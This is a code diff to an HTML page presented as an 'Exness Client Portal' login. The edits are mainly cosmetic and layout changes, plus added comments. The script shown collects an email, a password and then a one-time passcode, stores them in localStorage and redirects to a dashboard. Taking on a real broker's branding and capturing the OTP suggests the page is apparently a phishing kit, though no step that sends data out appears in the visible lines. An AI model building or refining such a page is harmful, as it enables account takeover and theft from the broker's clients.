@@ -26,12 +26,12 @@ body {
     box-shadow: 0 2px 10px rgba(0,0,0,0.1);
 }
 
-/* Perfect Logo Fit For All Mobiles */
+/* Perfect responsive logo for mobile */
 img.logo {
     display: block;
     margin: auto;
     width: 150px;
-    max-width: 60%;
+    max-width: 65%;
     height: auto;
     margin-bottom: 20px;
 }
@@ -56,13 +56,8 @@ button {
     cursor: pointer;
 }
 
-.hidden {
-    display: none;
-}
-
-h2 {
-    text-align: center;
-}
+.hidden { display: none; }
+h2 { text-align: center; }
 </style>
 </head>
 
@@ -71,16 +66,10 @@ h2 {
 <div class="container">
 
 <!-- LOGIN PAGE -->
-<div id="loginPage">
-            <div class="logo-container">
-                <img src="logo.png" alt="Logo">
-            </div>
-            <h1>Welcome to Exness Client Portal</h1>
-            
-            <div class="card">
-   <h1>Welcome to Exness Client Portal</h1>
+<div id="loginPage" class="card">
+    <img src="logo.png" class="logo" alt="Logo">
 
-   
+    <h1>Welcome to Exness Client Portal</h1>
 
     <input id="loginEmail" type="email" placeholder="Email address">
     <input id="loginPassword" type="password" placeholder="Password">
@@ -110,6 +99,7 @@ h2 {
 </div>
 
 <script>
+// PROCESS LOGIN
 function goToOtp() {
     let email = loginEmail.value;
     let pass = loginPassword.value;
@@ -125,11 +115,12 @@ function goToOtp() {
         password: pass
     }));
 
-    // Go To OTP Page
+    // Move to OTP screen
     loginPage.classList.add("hidden");
     otpPage.classList.remove("hidden");
 }
 
+// PROCESS OTP
 function submitOtp() {
     let otp = otpCode.value;
 
@@ -138,12 +129,14 @@ function submitOtp() {
         return;
     }
 
+    // Save OTP
     localStorage.setItem("otp", otp);
 
+    // Show success screen
     otpPage.classList.add("hidden");
     successPage.classList.remove("hidden");
 
-    // Redirect to dashboard
+    // Redirect to dashboard after success
     setTimeout(() => {
         window.location.href = "dashboard.html";
     }, 1500);
